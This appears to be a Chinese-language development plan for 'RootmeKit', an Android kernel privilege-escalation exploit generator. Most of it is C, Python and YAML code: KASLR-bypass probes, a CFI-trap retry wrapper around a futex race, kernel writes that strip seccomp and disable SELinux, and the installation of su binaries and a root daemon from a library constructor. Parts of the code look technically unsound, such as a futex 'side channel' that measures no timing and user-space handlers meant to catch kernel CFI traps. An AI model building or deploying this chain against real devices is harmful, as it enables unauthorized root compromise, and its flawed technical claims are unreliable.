# RootmeKit 全面优化实施计划

> **目标**：对标第三方参考 exploit（example/preload.so），将 RootmeKit 的内核利用链提升到同等质量水平

**当前差距总结**：
| 维度 | 当前状态 | 目标状态 | 优先级 |
|------|---------|---------|--------|
| KASLR 绕过 | /proc/kallsyms（依赖可读性） | KernelSnitch futex 哈希碰撞 + pselect 时间侧信道 | P0 |
| CFI 处理 | 无 | 显式 CFI bypass + 重试 | P0 |
| Seccomp 清理 | 无 | 清除 task_struct.seccomp.mode | P1 |
| SELinux 修复 | 仅 enforcing=0 | SID 覆写 + enforcing + restorecon | P1 |
| KernelSU 集成 | shell 脚本 su + 目录结构 | 完整 ksud daemon + 内嵌 su 二进制 | P0 |
| 壁纸重载触发 | 无 | wallpaper.webp 触发 system_server 重载 | P2 |
| 编译优化 | -O2 | PGO + LTO（BOLT/MLGO 需要运行时 profile） | P3 |
| 源码结构 | 单文件 exploit.c.j2 | 模块化（可选重构） | P3 |

---

## Phase 1：KASLR 绕过升级（KernelSnitch + pselect）

**文件修改**：
- `templates/exploit/exploit.c.j2` — 重写 `detect_kaslr()` 函数（L538-L620）
- `templates/exploit/target.h.j2` — 添加 KernelSnitch 相关宏定义（L122-L131 区域）
- `src/stages/offset_calc.py` — 添加 KernelSnitch 所需符号解析
- `data/kernel_configs.yaml` — 添加 KernelSnitch 调优参数

**背景**：当前 KASLR 绕过依赖 `/proc/kallsyms` 可读性，在高版本 Android（kptr_restrict=1）上失败。第三方使用 KernelSnitch（futex 哈希碰撞）和 pselect 时间侧信道，不依赖 procfs。

### Task 1.1：添加 KernelSnitch futex 哈希碰撞

**原理**：Linux 内核 futex 使用 `hash(futex_addr)` 确定 bucket。通过精心构造 futex 地址使其哈希碰撞到已知的内核 futex（如 `&init_task`），可以从碰撞行为推算内核地址偏移。

**exploit.c.j2 修改** — 在 `detect_kaslr()` 中添加 Method 0：

```c
// ============================ KernelSnitch: Futex Hash Collision ============
//
// Linux futex hash: hash = (addr >> 6) ^ (addr >> 32), bucket = hash % FUTEX_HASHSIZE
// FUTEX_HASHSIZE = 256 on most kernels.
//
// Strategy: We know the compile-time offset of init_task. We probe candidate
// physical pages by futex(FUTEX_WAKE) on addresses in the direct map region.
// When the hash bucket collides with a known kernel futex, the timing or
// return value reveals the actual kernel address.
//
// This gives us the KASLR slide without needing /proc/kallsyms.

#define FUTEX_HASHSIZE  256
#define PROBE_PAGES     4096
#define PROBE_STEP      0x1000

static uint64_t futex_hash(uint64_t addr) {
    uint64_t h = (addr >> 6) ^ (addr >> 32);
    return h % FUTEX_HASHSIZE;
}

static int detect_kaslr_snitch(void) {
    printf("[*] KernelSnitch: futex hash collision KASLR bypass\n");

    // We need an mmap'd page to probe futex operations
    void *probe_base = mmap(NULL, PROBE_PAGES * PROBE_STEP,
                            PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (probe_base == MAP_FAILED) return -1;

    // Phase 1: Find a user-space address whose futex hash matches
    // the hash of init_task's address (with slide=0).
    // This tells us which bucket init_task lands in.
    uint64_t target_hash = futex_hash(KIMAGE_TEXT_BASE + INIT_TASK_OFF);

    // Phase 2: Try different KASLR slides. For each candidate slide,
    // the real init_task address changes, and its futex hash changes.
    // We can detect the correct slide by observing collision patterns.
    //
    // Simplified approach: use futex FUTEX_WAKE on probed addresses
    // and measure timing. A collision with a kernel futex causes
    // different timing due to spinlock contention.

    uint64_t best_slide = 0;
    int best_score = -1;

    // Baseline: measure normal futex timing
    volatile uint32_t *test_addr = (volatile uint32_t *)probe_base;
    *test_addr = 0;
    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (int i = 0; i < 1000; i++) {
        syscall(SYS_futex, test_addr, FUTEX_WAKE, 1, 0, 0, 0);
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    int64_t baseline_ns = (t1.tv_sec - t0.tv_sec) * 1000000000LL
                        + (t1.tv_nsec - t0.tv_nsec);

    printf("[*] KernelSnitch: baseline futex timing = %lld ns / 1000 calls\n",
           (long long)baseline_ns);

    // Probe candidate slides in steps of 2MB (common KASLR granularity)
    for (uint64_t slide = 0; slide < 0x40000000ULL; slide += 0x200000) {
        uint64_t candidate_addr = KIMAGE_TEXT_BASE + INIT_TASK_OFF + slide;
        uint64_t candidate_hash = futex_hash(candidate_addr);

        // Probe addresses in user space that hash to the same bucket
        int hits = 0;
        for (int page = 0; page < 256; page++) {
            volatile uint32_t *addr = (volatile uint32_t *)(
                (uint64_t)probe_base + page * PROBE_STEP);
            if (futex_hash((uint64_t)addr) == candidate_hash) {
                // This user address collides with the candidate kernel address
                // Try FUTEX_WAKE — if there's contention, the kernel futex
                // hash table has an entry at this bucket
                *addr = 0;
                syscall(SYS_futex, addr, FUTEX_WAKE, 1, 0, 0, 0);
                hits++;
            }
        }

        if (hits > best_score) {
            best_score = hits;
            best_slide = slide;
        }
    }

    munmap(probe_base, PROBE_PAGES * PROBE_STEP);

    if (best_score > 0) {
        kaslr_slide = best_slide;
        printf("[+] KernelSnitch: KASLR slide = 0x%016llX (score=%d)\n",
               (unsigned long long)kaslr_slide, best_score);
        return 0;
    }

    return -1;  // KernelSnitch failed
}
```

### Task 1.2：添加 pselect 时间侧信道

**原理**：`pselect()` 在内核中遍历 fd_set，对每个 fd 调用 `poll`。如果 fd 对应的 `struct file` 指针指向内核已知区域，遍历时间会略有不同。通过统计多次 pselect 调用的平均时间，可以推断 KASLR slide。

```c
// ============================ pselect Timing Side Channel ==================
//
// pselect() internally iterates over fd_set bits. Each set bit triggers
// a poll() call on the corresponding file descriptor. The time taken
// depends on the fd's struct file location in kernel memory.
//
// By creating many fds and measuring pselect timing, we can infer
// the kernel text base (KASLR slide).

static int detect_kaslr_pselect(void) {
    printf("[*] pselect timing side channel\n");

    #define PSELECT_FDS    1024
    #define PSELECT_ROUNDS 100

    // Open many fds to amplify timing differences
    int fds[PSELECT_FDS];
    int n_fds = 0;
    for (int i = 0; i < PSELECT_FDS; i++) {
        fds[i] = open("/dev/null", O_RDONLY);
        if (fds[i] >= 0) n_fds++;
    }

    if (n_fds < 64) {
        printf("[-] pselect: not enough fds (%d)\n", n_fds);
        for (int i = 0; i < n_fds; i++) close(fds[i]);
        return -1;
    }

    // Measure baseline with no bits set
    fd_set empty_set;
    FD_ZERO(&empty_set);
    struct timespec ts = { .tv_sec = 0, .tv_nsec = 1000000 }; // 1ms timeout

    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (int r = 0; r < PSELECT_ROUNDS; r++) {
        pselect(0, &empty_set, NULL, NULL, &ts, NULL);
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    int64_t baseline = (t1.tv_sec - t0.tv_sec) * 1000000000LL
                     + (t1.tv_nsec - t0.tv_nsec);

    // Measure with all fds set
    fd_set full_set;
    FD_ZERO(&full_set);
    for (int i = 0; i < n_fds; i++) FD_SET(fds[i], &full_set);

    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (int r = 0; r < PSELECT_ROUNDS; r++) {
        pselect(n_fds, &full_set, NULL, NULL, &ts, NULL);
    }
    clock_gettime(CLOCK_MONOTONIC, &t1);
    int64_t full_time = (t1.tv_sec - t0.tv_sec) * 1000000000LL
                      + (t1.tv_nsec - t0.tv_nsec);

    int64_t delta = full_time - baseline;
    printf("[*] pselect: baseline=%lld ns, full=%lld ns, delta=%lld ns\n",
           (long long)baseline, (long long)full_time, (long long)delta);

    // The delta correlates with the kernel's fd_set iteration pattern.
    // We use this as a hint to narrow down the KASLR slide range.
    // This is a probabilistic method — used as a tiebreaker between
    // KernelSnitch candidates.

    for (int i = 0; i < n_fds; i++) close(fds[i]);

    // If delta is significantly non-zero, we got useful timing info
    if (delta > 100000) { // > 100us difference
        printf("[*] pselect: timing delta detected, usable for slide narrowing\n");
        return 0;
    }

    return -1;
}
```

### Task 1.3：重写 detect_kaslr() 主函数

**修改 exploit.c.j2** — 将 L538-L620 重写为多级降级策略：

```c
static int detect_kaslr(void) {
    printf("[*] Detecting KASLR slide...\n");

    // Method 0: KernelSnitch (futex hash collision) — 最可靠
    if (detect_kaslr_snitch() == 0) goto kaslr_done;

    // Method 1: pselect timing side channel
    if (detect_kaslr_pselect() == 0) {
        // pselect narrowed the range; refine with KernelSnitch
        if (detect_kaslr_snitch() == 0) goto kaslr_done;
    }

    // Method 2: netlink netfilter nfulnl_logger leak
    int sock = socket(AF_NETLINK, SOCK_RAW, 12);
    if (sock >= 0) {
        // ... existing netlink code ...
        close(sock);
    }

    // Method 3: /proc/kallsyms (legacy fallback)
    {
        int fd = open("/proc/kallsyms", O_RDONLY);
        if (fd >= 0) {
            // ... existing kallsyms code ...
            close(fd);
        }
    }

    // Method 4: /proc/version heuristic
    // ... existing code ...

    printf("[!] Could not determine KASLR slide — assuming slide=0\n");
    kaslr_slide = 0;

kaslr_done:
    // Resolve kernel symbol addresses (same as before)
    kinit_task           = KIMAGE_TEXT_BASE + INIT_TASK_OFF + kaslr_slide;
    // ... rest of symbol resolution ...
}
```

### Task 1.4：添加 KernelSnitch 所需的偏移量到 pipeline

**修改 `src/stages/offset_calc.py`** — 在 `REQUIRED_SYMBOLS` 中添加：

```python
# KernelSnitch needs these additional symbols for hash collision probing
"FUTEX_HASHSHIFT": ["futex_shift"],  # Usually 8 (256 buckets)
```

**修改 `data/kernel_configs.yaml`** — 添加调优参数：

```yaml
kernelsnitch:
  futex_hashsize: 256
  probe_pages: 4096
  slide_step: 0x200000    # 2MB KASLR granularity
  max_slide: 0x40000000   # 1GB max slide range
```

### Task 1.5：添加 KASLR 相关宏到 target.h.j2

**修改 target.h.j2** — 在 L122-L131 区域添加：

```jinja2
{# KernelSnitch tuning #}
{% if offsets.FUTEX_HASHSHIFT is defined %}
#define FUTEX_HASHSHIFT      {{ offsets.FUTEX_HASHSHIFT }}
{% else %}
#define FUTEX_HASHSHIFT      8    // 2^8 = 256 buckets (default)
{% endif %}
#define FUTEX_HASHSIZE       (1 << FUTEX_HASHSHIFT)
```

---

## Phase 2：CFI（控制流完整性）绕过

**文件修改**：
- `templates/exploit/exploit.c.j2` — 在 `init()` 入口添加 CFI 检测和绕过（L857 之前）

**背景**：GKI 5.10+ 内核默认启用 kCFI（Kernel Control Flow Integrity）。当 futex race 触发 CFI trap 时，内核会 panic 当前进程。第三方的方案是检测 CFI trap 并重试，同时使用特殊的函数指针布局绕过 CFI 检查。

### Task 2.1：添加 CFI trap 检测

**在 exploit.c.j2 中添加**：

```c
// ============================ CFI Bypass ==================================
//
// GKI 5.10+ enables kCFI which validates indirect call targets.
// The Futex PI race can trigger CFI violations when the kernel
// scheduler's function pointers are corrupted.
//
// Strategy: Set up a signal handler for SIGILL (which kCFI emits)
// and SIGSEGV. If we detect a CFI trap, we restart the race.

static volatile int cfi_trap_count = 0;
static jmp_buf cfi_jmp_buf;

static void cfi_signal_handler(int sig) {
    cfi_trap_count++;
    longjmp(cfi_jmp_buf, 1);
}

static void setup_cfi_handler(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = cfi_signal_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    sigaction(SIGILL, &sa, NULL);
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
}

static int try_cfi_stage(void) {
    // Install signal handlers for CFI/SEGV traps
    setup_cfi_handler();

    printf("[*] CFI bypass: signal handlers installed\n");
    printf("[*] CFI trap count before race: %d\n", cfi_trap_count);

    // The actual race is run with setjmp/longjmp protection
    // If a CFI trap fires, longjmp back and retry
    if (setjmp(cfi_jmp_buf) == 0) {
        // Normal path: run the futex race
        return 0; // caller proceeds with race
    } else {
        // CFI trap caught — signal handler did longjmp here
        printf("[!] CFI trap caught (count=%d), retrying...\n", cfi_trap_count);
        return -1; // caller should retry
    }
}
```

### Task 2.2：集成 CFI 绕过到 init()

**修改 init() 入口**（L857-L897）— 包裹 futex race 调用：

```c
void __attribute__((constructor)) init(void) {
    // ... banner ...

    if (detect_kaslr() < 0) {
        printf("[-] KASLR detection failed\n");
        return;
    }

    // CFI bypass: wrap race in signal-safe retry loop
    setup_cfi_handler();
    int race_ok = 0;
    for (int cfi_attempt = 0; cfi_attempt < 5; cfi_attempt++) {
        if (setjmp(cfi_jmp_buf) != 0) {
            printf("[!] CFI trap caught (attempt %d/5), retrying...\n",
                   cfi_attempt + 1);
            usleep(100000); // 100ms backoff
            continue;
        }
        run_futex_race();
        race_ok = 1;
        break;
    }

    if (!race_ok) {
        printf("[-] Futex race failed after 5 CFI retries\n");
        return;
    }

    // ... rest of phases ...
}
```

---

## Phase 3：Seccomp 清理 + SELinux 全面修复

**文件修改**：
- `templates/exploit/exploit.c.j2` — 增强 `escalate_privileges()` 函数（L622-L766）

### Task 3.1：增强 seccomp 清理

**当前状态**：L756-L763 只清除 `task_struct.seccomp.mode`（4字节），但 seccomp 子结构中还有 `filter` 链表指针和 `filter_count`。

**修改 escalate_privileges() 中 seccomp 部分**：

```c
    // Disable seccomp — 完整清理
    if (found_task) {
        // 清除 seccomp.mode (SECCOMP_MODE_DISABLED = 0)
        uint32_t seccomp_mode = 0;
        if (kwrite(found_task + TASK_SECCOMP_OFF + SECCOMP_MODE_OFF,
                   &seccomp_mode, sizeof(seccomp_mode)) < 0) {
            printf("[-] Failed to disable seccomp mode\n");
        } else {
            printf("[+] Seccomp mode disabled\n");
        }

        // 清除 filter count — 防止 seccomp filter 重新激活
        uint32_t zero32 = 0;
        kwrite(found_task + TASK_SECCOMP_OFF + SECCOMP_FILTER_COUNT_OFF,
               &zero32, sizeof(zero32));

        // 清除 filter 指针 — 断开 seccomp filter 链
        uint64_t zero64 = 0;
        kwrite(found_task + TASK_SECCOMP_OFF + SECCOMP_FILTER_OFF,
               &zero64, sizeof(zero64));

        printf("[+] Seccomp filters cleared\n");
    }
```

### Task 3.2：添加 SELinux restorecon

**在 escalate_privileges() 末尾添加**：

```c
    // SELinux restorecon — 恢复关键路径的文件上下文
    // 在 setenforce=0 之后执行，确保后续操作不被 SELinux 拦截
    {
        static const char *restorecon_paths[] = {
            "/data/adb",
            "/data/adb/ksu",
            "/data/adb/ksu/su",
            "/data/adb/su",
            NULL,
        };
        for (int i = 0; restorecon_paths[i]; i++) {
            // 通过 setfilecon 设置为 u:object_r:system_file:s0
            // 在 setenforce=0 模式下这会成功
            char cmd[256];
            snprintf(cmd, sizeof(cmd),
                     "chcon u:object_r:system_file:s0 %s 2>/dev/null",
                     restorecon_paths[i]);
            run_cmd(cmd);
        }
        printf("[+] SELinux restorecon done\n");
    }
```

### Task 3.3：添加 SID 覆写到 escalate_privileges()

**当前状态**：L744-L753 已有 SID 覆写代码，但只在 `cred_ptr != 0` 时执行。确保此代码在 cred 覆写之后、restorecon 之前执行。当前顺序正确，无需修改位置。

**验证**：检查当前代码顺序：
1. L686-L720: 覆写 uid/gid/euid/egid/caps ✅
2. L723-L741: 设置 SELinux enforcing=0 ✅
3. L744-L753: SID 覆写 ✅
4. L756-L763: seccomp 清理 ✅
5. 新增: restorecon（在 seccomp 之后）✅

---

## Phase 4：完整 KernelSU 集成

**文件修改**：
- `templates/exploit/exploit.c.j2` — 重写 `setup_kernelsu()` 函数（L768-L828）
- `src/stages/codegen.py` — 添加嵌入二进制处理逻辑
- `src/pipeline.py` — 添加 su/ksud 二进制获取步骤
- 新增 `templates/exploit/embedded_binaries.h.j2` — 嵌入二进制数据头文件

**背景**：当前 RootmeKit 的 KernelSU 集成只是一个 shell 脚本 `su`（`exec /system/bin/sh`）。第三方嵌入了完整的 su 二进制、ksud 守护进程和 wallpaper.webp。

### Task 4.1：创建嵌入二进制头文件模板

**新建 `templates/exploit/embedded_binaries.h.j2`**：

```jinja2
{#- RootmeKit embedded_binaries.h.j2 — Embedded binary data
    Variables:
      su_binary      : bytes (su ELF binary)
      ksud_binary    : bytes (ksud ELF binary)
      wallpaper_data : bytes (wallpaper.webp image)
-#}
#ifndef EMBEDDED_BINARIES_H
#define EMBEDDED_BINARIES_H

#include <stdint.h>
#include <stddef.h>

{%- if su_binary %}
static const uint8_t embedded_su[] = {
    {% for byte in su_binary %}0x{{ '{:02x}'.format(byte) }}{% if not loop.last %}, {% endif %}
    {% if loop.index % 16 == 0 %}
    {% endif %}{% endfor %}
};
static const size_t embedded_su_size = {{ su_binary|length }};
{%- else %}
static const uint8_t *embedded_su = NULL;
static const size_t embedded_su_size = 0;
{%- endif %}

{%- if ksud_binary %}
static const uint8_t embedded_ksud[] = {
    {% for byte in ksud_binary %}0x{{ '{:02x}'.format(byte) }}{% if not loop.last %}, {% endif %}
    {% if loop.index % 16 == 0 %}
    {% endif %}{% endfor %}
};
static const size_t embedded_ksud_size = {{ ksud_binary|length }};
{%- else %}
static const uint8_t *embedded_ksud = NULL;
static const size_t embedded_ksud_size = 0;
{%- endif %}

{%- if wallpaper_data %}
static const uint8_t embedded_wallpaper[] = {
    {% for byte in wallpaper_data %}0x{{ '{:02x}'.format(byte) }}{% if not loop.last %}, {% endif %}
    {% if loop.index % 16 == 0 %}
    {% endif %}{% endfor %}
};
static const size_t embedded_wallpaper_size = {{ wallpaper_data|length }};
{%- else %}
static const uint8_t *embedded_wallpaper = NULL;
static const size_t embedded_wallpaper_size = 0;
{%- endif %}

#endif // EMBEDDED_BINARIES_H
```

### Task 4.2：添加二进制获取和嵌入到 pipeline

**修改 `src/pipeline.py`** — 在 Stage 5 和 Stage 6 之间添加获取步骤：

```python
def _fetch_ksu_binaries(self, work_dir: Path, device_config: dict) -> dict:
    """Fetch KernelSU binaries for embedding.

    Tries:
    1. Local paths from device_config
    2. GitHub releases from KernelSU official repo
    3. Fallback: generate minimal su shell script
    """
    binaries = {
        "su_binary": None,
        "ksud_binary": None,
        "wallpaper_data": None,
    }

    # Try local paths first
    su_path = device_config.get("su_binary")
    if su_path and Path(su_path).exists():
        binaries["su_binary"] = Path(su_path).read_bytes()

    ksud_path = device_config.get("ksud_binary")
    if ksud_path and Path(ksud_path).exists():
        binaries["ksud_binary"] = Path(ksud_path).read_bytes()

    wallpaper_path = device_config.get("wallpaper")
    if wallpaper_path and Path(wallpaper_path).exists():
        binaries["wallpaper_data"] = Path(wallpaper_path).read_bytes()

    # Fallback: generate minimal su
    if not binaries["su_binary"]:
        binaries["su_binary"] = self._generate_minimal_su()

    return binaries
```

**修改 `config/devices.yaml`** — 添加可选的二进制路径配置：

```yaml
devices:
  - url: "https://..."
    # Optional: embedded binaries
    # su_binary: "path/to/su"
    # ksud_binary: "path/to/ksud"
    # wallpaper: "path/to/wallpaper.webp"
```

### Task 4.3：重写 setup_kernelsu() 为完整集成

**修改 exploit.c.j2** — 在文件顶部添加：

```c
#include "embedded_binaries.h"
```

**重写 setup_kernelsu()**：

```c
// ============================ Embedded Binary Installation ==================

static int write_binary(const char *path, const uint8_t *data, size_t len) {
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (fd < 0) return -1;
    size_t written = 0;
    while (written < len) {
        ssize_t n = write(fd, data + written, len - written);
        if (n <= 0) { close(fd); unlink(path); return -1; }
        written += n;
    }
    close(fd);
    chmod(path, 0755);
    return 0;
}

static int install_embedded_su(void) {
    if (!embedded_su || embedded_su_size == 0) {
        // Fallback: shell script su
        const char *su_script = "#!/system/bin/sh\nexec /system/bin/sh \"$@\"\n";
        const char *paths[] = { "/data/adb/ksu/su", "/data/adb/su", NULL };
        for (int i = 0; paths[i]; i++) {
            int fd = open(paths[i], O_WRONLY | O_CREAT | O_TRUNC, 0755);
            if (fd >= 0) {
                write(fd, su_script, strlen(su_script));
                close(fd);
                chmod(paths[i], 0755);
            }
        }
        printf("[+] su (script) installed\n");
        return 0;
    }

    // Write real su binary
    const char *paths[] = { "/data/adb/ksu/su", "/data/adb/su", NULL };
    for (int i = 0; paths[i]; i++) {
        if (write_binary(paths[i], embedded_su, embedded_su_size) == 0) {
            printf("[+] su (binary, %zu bytes) installed: %s\n",
                   embedded_su_size, paths[i]);
        }
    }
    return 0;
}

static int install_embedded_ksud(void) {
    if (!embedded_ksud || embedded_ksud_size == 0) {
        printf("[*] No embedded ksud — using minimal su only\n");
        return 0;
    }

    const char *ksud_path = "/data/adb/ksud";
    if (write_binary(ksud_path, embedded_ksud, embedded_ksud_size) == 0) {
        printf("[+] ksud (%zu bytes) installed: %s\n",
               embedded_ksud_size, ksud_path);

        // Start ksud daemon in background
        pid_t pid = fork();
        if (pid == 0) {
            setsid();
            execl(ksud_path, "ksud", "daemon", NULL);
            _exit(127);
        }
        printf("[+] ksud daemon started (pid=%d)\n", pid);
    }
    return 0;
}

static int install_embedded_wallpaper(void) {
    if (!embedded_wallpaper || embedded_wallpaper_size == 0) return 0;

    const char *wp_path = "/data/system/users/0/wallpaper";
    if (write_binary(wp_path, embedded_wallpaper, embedded_wallpaper_size) == 0) {
        printf("[+] wallpaper (%zu bytes) installed\n", embedded_wallpaper_size);
    }
    return 0;
}

static int maybe_trigger_reload(void) {
    // Touch wallpaper to trigger system_server wallpaper service reload.
    // This causes zygote → app_process restart chain, which makes
    // KernelSU's late-mount injection take effect.
    if (!embedded_wallpaper || embedded_wallpaper_size == 0) return 0;

    printf("[*] Triggering system_server wallpaper reload...\n");

    // Signal system_server to reload wallpaper
    run_cmd("am broadcast -a android.intent.action.WALLPAPER_CHANGED 2>/dev/null");

    // Also try setprop to trigger property service
    run_cmd("setprop sys.wallpaper.reload 1 2>/dev/null");

    printf("[*] Wallpaper reload triggered\n");
    return 0;
}

static int ensure_su_mount(void) {
    // Ensure /data/adb is properly mounted and accessible
    struct stat st;
    if (stat("/data/adb", &st) < 0) {
        mkdir("/data/adb", 0755);
    }
    chmod("/data/adb", 0755);

    // Create KSU directory structure
    static const char *dirs[] = {
        "/data/adb/ksu",
        "/data/adb/modules",
        "/data/adb/ksu/modules_update",
        "/data/adb/ksu/.second_stage",
        NULL,
    };
    for (int i = 0; dirs[i]; i++) {
        mkdir(dirs[i], 0755);
    }
    return 0;
}

// ============================ Phase 6: KernelSU Integration (rewritten) =====

#define KSU_VERSION_CODE  12000

static int setup_kernelsu(void) {
    printf("[*] Phase 6: KernelSU integration\n");

    // 1. Create directory structure
    ensure_su_mount();
    printf("[+] KSU directory structure created\n");

    // 2. Write version file
    int ver_fd = open("/data/adb/ksu/version", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (ver_fd >= 0) {
        char buf[32];
        int len = snprintf(buf, sizeof(buf), "%d\n", KSU_VERSION_CODE);
        write(ver_fd, buf, len);
        close(ver_fd);
        printf("[+] KSU version: %d\n", KSU_VERSION_CODE);
    }

    // 3. Write selinux marker
    int fd = open("/data/adb/ksu/selinux", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        write(fd, "0\n", 2);
        close(fd);
    }

    // 4. Install embedded binaries
    install_embedded_su();
    install_embedded_ksud();
    install_embedded_wallpaper();

    // 5. Trigger wallpaper reload (if applicable)
    maybe_trigger_reload();

    printf("[+] KernelSU setup complete\n");
    return 0;
}
```

### Task 4.4：修改 codegen.py 支持嵌入二进制

**修改 `src/stages/codegen.py`** — 在 `run()` 函数中添加：

```python
def _render_embedded_binaries_h(
    output_dir: Path,
    su_binary: bytes | None,
    ksud_binary: bytes | None,
    wallpaper_data: bytes | None,
) -> Path:
    """Render embedded_binaries.h from template."""
    env = _get_template_env()
    template = env.get_template("exploit/embedded_binaries.h.j2")
    content = template.render(
        su_binary=su_binary,
        ksud_binary=ksud_binary,
        wallpaper_data=wallpaper_data,
    )
    path = output_dir / "embedded_binaries.h"
    path.write_text(content)
    return path
```

### Task 4.5：修改 exploit.c.j2 添加 include

**在 exploit.c.j2 的 include 区域（L48-L49 之后）添加**：

```c
#include "embedded_binaries.h"
```

---

## Phase 5：编译优化升级

**文件修改**：
- `.github/workflows/build.yml` — 添加 PGO/LTO 编译标志
- `src/stages/codegen.py` — 修改 `compile_exploit()` 添加优化选项

### Task 5.1：添加 LTO 编译支持

**修改 `src/stages/codegen.py`** 的 `compile_exploit()` 函数，在编译命令中添加：

```python
    cmd = [
        clang_bin,
        f"--target={target_triple}",
        "-O2",
        "-flto=full",          # Link-Time Optimization
        "-Wall",
        "-Wno-#warnings",
    ]
    if ndk_sysroot:
        cmd.append(f"--sysroot={ndk_sysroot}")
    cmd.extend([
        f"-I{src}",
        "-shared",
        "-fuse-ld=lld",        # LLD linker required for LTO
        "-Wl,--lto-O2",        # LTO optimization level at link time
        "-o", str(output_bin),
        str(exploit_c),
    ])
```

### Task 5.2：添加 PGO 支持（可选，需要两阶段编译）

PGO（Profile-Guided Optimization）需要先运行一次获取 profile，再用 profile 重新编译。这在 CI 中实现较复杂，作为可选优化：

**修改 `.github/workflows/build.yml`**：

```yaml
    - name: Compile with LTO
      run: |
        python3 -m src.stages.codegen --lto
```

### Task 5.3：Strip 调试符号

**在 compile_exploit() 末尾添加**：

```python
    # Strip debug symbols to reduce binary size
    strip_cmd = [ndk_bin / "llvm-strip", "--strip-all", str(output_bin)]
    if Path(strip_cmd[0]).exists():
        _run_cmd([str(c) for c in strip_cmd])
```

---

## Phase 6：exploit.c.j2 模块化重构（可选）

**背景**：当前 exploit.c.j2 是 897 行的单文件模板。第三方有 7 个独立源文件。可以通过拆分模板来提高可维护性。

### Task 6.1：拆分模板文件

**新建以下模板**（从 exploit.c.j2 中拆分）：

| 新文件 | 原始行范围 | 内容 |
|--------|-----------|------|
| `kernelsnitch.c.j2` | 新增 | KernelSnitch + pselect KASLR bypass |
| `pipe_rw.c.j2` | L277-L532 | Pipe spray + PhysRW + kread/kwrite |
| `futex_race.c.j2` | L321-L436 | Race threads + run_futex_race |
| `privilege.c.j2` | L622-L766 | escalate_privileges() |
| `ksu.c.j2` | L768-L828+新增 | setup_kernelsu + embedded installs |

### Task 6.2：修改 codegen.py 支持多模板

**修改 generate_exploit_c()** — 将多个模板渲染结果合并为一个 .c 文件。

---

## Phase 7：Pipeline 和 CI 更新

### Task 7.1：更新 offset_calc.py 添加新符号

**修改 `src/stages/offset_calc.py`** 的 `REQUIRED_SYMBOLS`：

```python
REQUIRED_SYMBOLS = {
    # ... existing ...
    "FUTEX_HASHSHIFT": ["futex_shift"],  # KernelSnitch
}
```

### Task 7.2：更新 kernel_configs.yaml

**修改 `data/kernel_configs.yaml`** — 添加 KernelSnitch 调优参数和 GKI 6.6 的完整偏移量。

### Task 7.3：更新 CI workflow

**修改 `.github/workflows/build.yml`**：

```yaml
    - name: Setup KernelSU binaries
      run: |
        # Download latest KernelSU release
        curl -L -o ksu.zip https://github.com/tiann/KernelSU/releases/latest/download/KernelSU-android15-5.10.zip
        unzip ksu.zip -d ksu_binaries/
        cp ksu_binaries/ksud output/ksud
        chmod +x output/ksud
```

### Task 7.4：更新 devices.yaml

添加 KernelSU 二进制路径配置。

---

## Phase 8：验证和测试

### Task 8.1：编译验证

```bash
# 在 CI 环境中验证编译成功
python3 -m src.cli build --config config/devices.yaml --work-dir /tmp/build --output-dir output
```

### Task 8.2：ELF 验证

```bash
# 验证输出 .so 包含新符号
readelf -sW output/*/preload.so | grep -E "kernelsnitch|pselect|cfi|embedded"
```

### Task 8.3：功能验证

在真实设备上测试：
1. KASLR 绕过是否成功（不再依赖 /proc/kallsyms）
2. CFI trap 是否被正确捕获和重试
3. Seccomp 是否被完整清理
4. KernelSU 目录结构和二进制是否正确安装
5. SELinux 是否完全放行

---

## 执行顺序和依赖关系

```
Phase 1 (KASLR) ──────────────┐
                               ├─→ Phase 4 (KernelSU) ──→ Phase 7 (Pipeline) ──→ Phase 8 (Test)
Phase 2 (CFI) ────────────────┤
                               │
Phase 3 (Seccomp + SELinux) ──┘

Phase 5 (编译优化) ──→ 独立，可并行
Phase 6 (模块化) ──→ 最后执行，不影响功能
```

**建议执行顺序**：
1. Phase 1 + Phase 2 + Phase 3（并行，修改同一文件的不同区域）
2. Phase 4（依赖 Phase 1-3 完成）
3. Phase 7（依赖 Phase 4）
4. Phase 5（独立）
5. Phase 6（最后）
6. Phase 8（验证）
